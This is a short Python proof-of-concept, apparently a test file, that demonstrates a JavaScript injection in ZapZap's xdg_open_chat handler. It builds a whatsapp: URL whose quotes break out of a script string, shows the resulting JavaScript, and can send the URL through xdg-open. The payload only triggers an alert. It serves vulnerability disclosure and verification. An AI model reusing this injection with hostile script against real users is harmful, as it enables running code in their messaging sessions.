#!/usr/bin/env python3
"""Benign local PoC for ZapZap xdg_open_chat JavaScript injection.

This script demonstrates how an already-running ZapZap instance can receive a
crafted whatsapp: URL whose quote characters break out of the JavaScript string
built by PageController.xdg_open_chat(). The payload only displays an alert.

Usage:
  python3 tests/poc_xdg_open_chat_injection.py          # print only
  python3 tests/poc_xdg_open_chat_injection.py --run    # call xdg-open
"""

from __future__ import annotations

import argparse
import shutil
import subprocess
import sys


def build_payload() -> str:
    """Return a harmless payload that proves JavaScript execution."""
    return 'whatsapp:x";alert(document.title);a.href="y'


def vulnerable_script(url: str) -> str:
    """Mirror the vulnerable JavaScript concatenation for verification."""
    return (
        '(function(){var a = document.createElement("a");a.href="'
        + url
        + '";document.body.appendChild(a);a.click();a.remove(); return;})();'
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Demonstrate ZapZap xdg_open_chat JavaScript injection with a benign alert()."
    )
    parser.add_argument(
        "--run",
        action="store_true",
        help="send the crafted whatsapp: URL to the desktop handler with xdg-open",
    )
    args = parser.parse_args()

    payload = build_payload()
    print("Crafted URL:")
    print(payload)
    print("\nJavaScript produced by the vulnerable concatenation:")
    print(vulnerable_script(payload))

    if not args.run:
        print("\nDry run only. Start ZapZap, log in, then rerun with --run to trigger the benign alert.")
        return 0

    xdg_open = shutil.which("xdg-open")
    if not xdg_open:
        print("xdg-open was not found in PATH", file=sys.stderr)
        return 1

    subprocess.run([xdg_open, payload], check=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
